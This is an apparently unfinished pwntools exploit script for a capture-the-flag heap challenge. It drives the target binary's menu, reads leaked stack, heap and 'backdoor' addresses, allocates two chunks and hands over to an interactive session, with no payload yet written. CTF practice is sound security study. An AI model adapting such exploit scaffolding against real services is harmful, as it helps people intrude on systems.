from pwn import *

# context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'

p = process('./hack')
# p = remote('127.0.0.1', 23455)

def addi(size, content):
    p.sendlineafter('choice>', '1')
    p.sendlineafter('size>', str(size))
    p.sendlineafter('content>', content)

def deli(index):
    p.sendlineafter('choice>', '2')
    p.sendlineafter('index>', str(index))

def modi(index, content):
    p.sendlineafter('choice>', '3')
    p.sendlineafter('index>', str(index))
    p.sendlineafter('content>', content)

def dspi(index):
    p.sendlineafter('choice>', '9')
    p.sendlineafter('index>', str(index))
    p.recvuntil('content>')
    p.info('content at %d: %r', index, p.recvline())


il_addr = int(p.recv(11), 16)
dokodemo_doa = int(p.recv(11), 16)
stack_addr = int(p.recv(11), 16)
heap_addr = int(p.recvline(), 16)
p.info('itemlist addr: 0x%x', il_addr)
p.info('backdoor addr: 0x%x', dokodemo_doa)
p.info('stack addr: 0x%x', stack_addr)
p.info('heap addr: 0x%x', heap_addr)



addi(0x20, 'sekai de ichiban')
addi(0x30, 'southern university of science and technology')



p.interactive()
